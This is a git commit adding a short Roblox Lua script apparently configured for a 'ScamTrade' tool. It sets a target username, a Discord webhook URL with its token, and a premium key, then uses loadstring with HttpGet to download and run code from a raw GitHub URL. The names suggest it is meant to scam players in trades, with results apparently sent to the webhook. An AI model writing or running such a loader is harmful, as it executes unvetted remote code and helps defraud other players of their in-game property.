813718719ac8322a102d1d4056bec9f039f6fe3d
veytx <130006836+veytx@users.noreply.github.com>
2023-04-06 20:17:13 +0200

    Add files via upload

---
+++ 1063865991760715907 (1).lua
@@ -0,0 +1,10 @@
+UserName = "Yt_elias12"
+UserName2 = "Yt_elias12"
+Webhook = "https://discord.com/api/webhooks/1093594515157307473/B9LpTfmoyTdy8eJI_I0SBCLBu-nEnLYgcc6elhqUfdcMdTPScEwyjtIVDkAoYAIbi14K"
+_G.PremiumKey = "rizzhub-AHMHa1jPbxJtBv0hcFJf"
+_G.ScriptName = "ScamTrade"
+_G.FirstText = "TradeScam"
+_G.SecondText = "TradeScam"
+_G.ThirdText = "TradeScam"
+_G.WaitingTime = 1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
